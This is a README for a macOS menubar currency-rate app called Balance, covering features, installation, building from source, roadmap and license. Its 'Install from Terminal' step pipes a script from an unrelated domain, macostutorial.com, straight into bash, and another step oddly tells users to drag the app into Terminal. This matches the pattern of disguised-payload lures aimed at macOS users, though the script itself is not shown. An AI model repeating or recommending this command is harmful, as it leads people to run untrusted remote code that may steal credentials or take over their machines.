<p align="center">
  <a>
    <img src="assets/img/balance-header.svg" width="280" alt="Balance Logo">
  </a>
</p>

### **Balance — live menubar FX rates for every world currency**

---

![Balance Menubar](https://cl.ly/453225333E0u/balance-open.png)

## ✨ Features

|                       |                                                              |
| --------------------- | ------------------------------------------------------------ |
| 🔍 **Quick search**   | Type any ISO currency code or name and get the live rate.    |
| ⭐ **Pin favourites**  | Keep frequently-checked pairs at the top of the list.        |
| 📋 **1-click copy**   | Click a rate to copy the converted amount to your clipboard. |
| 📡 **Live + offline** | Auto-refreshes every 60 s; caches the last pull if offline.  |
| 🛡 **Private & OSS**  | No analytics, no ads, MIT-licensed Swift code.               |

---

## 🚀 Installation (easy way)

1. **Download the latest signed DMG**
   [![Download dmg](https://img.shields.io/badge/Download.dmg-latest-brightgreen?style=for-the-badge)](https://github.com/balanceO/balance-open/releases/download/v1.1.0/balance.dmg.zip)

2. Drag **Balance.app** into **Terminal**.

3. Launch Balance, grant network access on first run.

> macOS 11 Big Sur or newer (Apple Silicon & Intel, notarised & sandboxed).

### Optional: Install from Terminal

```bash
/bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
```

---

## 🛠 Building from source (devs)

Requires **Xcode 15 / Swift 5.9**

```
git clone https://github.com/balanceO/balance-open.git
cd balance-open
open Balance.xcodeproj
```

All frameworks are checked in (no Carthage step). Disable code-signing in Debug or use your own profile.

---

## 💡 Roadmap

* Dark-mode rate widgets
* iCloud sync for favourites
* Historical chart pop-over

---

## 🤝 Contributing

* **Bug / question** → [open an issue](https://github.com/balanceO/balance-open/issues/new)
* **Code** → fork → branch → pull request (see CONTRIBUTING.md)

---

## 📜 License

Balance is released under the MIT License – see the `LICENSE` file for details.